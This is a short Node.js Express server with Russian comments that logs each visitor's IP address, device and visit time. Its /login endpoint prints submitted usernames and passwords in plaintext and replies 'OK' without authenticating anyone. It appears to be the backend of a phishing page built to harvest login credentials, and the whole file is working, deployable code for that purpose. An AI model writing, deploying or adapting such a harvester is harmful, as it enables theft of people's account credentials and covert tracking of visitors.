const express = require('express');
const app = express();
const path = require('path');

// ВАЖНО: Говорим Express доверять прокси Render, чтобы видеть реальный IP посетителя
app.set('trust proxy', true);

// Позволяем серверу читать JSON из запросов
app.use(express.json());

// 🌐 ЛОГГЕР ПОСЕЩЕНИЙ (ДОЛЖЕН СТОЯТЬ ПЕРЕД РАЗДАЧЕЙ СТАТИКИ)
app.use((req, res, next) => {
    // Логируем только заходы на главную страницу, чтобы не спамить картинками
    if (req.method === 'GET' && (req.path === '/' || req.path === '/index.html')) {
        const ip = req.ip || req.connection.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Неизвестное устройство';
        const time = new Date().toLocaleString('ru-RU');
        
        console.log('\n====================================');
        console.log(`🌐 НОВЫЙ ПОСЕТИТЕЛЬ ЗАШЕЛ НА САЙТ!`);
        console.log(`📍 IP: ${ip}`);
        console.log(`💻 Устройство: ${userAgent}`);
        console.log(`⏰ Время: ${time}`);
        console.log('====================================\n');
    }
    next();
});

// Раздаем статические файлы (HTML, CSS, JS, картинки)
app.use(express.static(__dirname));

// Обработка отправки формы (ЛОГИНЫ И ПАРОЛИ)
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    console.log('\n====================================');
    console.log(`🔥 НОВЫЙ ЛОГИН!`);
    console.log(`👤 Юзер: ${username}`);
    console.log(`🔑 Пароль: ${password}`);
    console.log(`⏰ Время: ${new Date().toLocaleString('ru-RU')}`);
    console.log('====================================\n');

    res.status(200).send('OK');
});

// Запуск сервера на порту, который дает Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
